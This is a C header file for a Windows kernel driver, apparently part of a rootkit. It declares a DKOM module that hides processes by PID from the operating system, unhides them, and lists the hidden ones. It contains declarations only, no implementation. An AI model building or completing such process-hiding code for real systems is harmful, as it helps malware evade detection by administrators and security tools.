#pragma once
#include "Shared.h"

// Never Hide
#define SYSTEM_PROCESS_PID 4

//
// DKOM process module lifecycle. Invoked from DriverEntry / DriverUnload.
//
NTSTATUS ProcessModuleInitialize(VOID);
VOID ProcessModuleCleanup(VOID);

NTSTATUS ProcessHide(ULONG ProcessId);
NTSTATUS ProcessUnhide(ULONG ProcessId);

//
// Fills Response with the PIDs currently hidden.
//
NTSTATUS ProcessListHidden(PPROCESS_LIST_RESPONSE Response);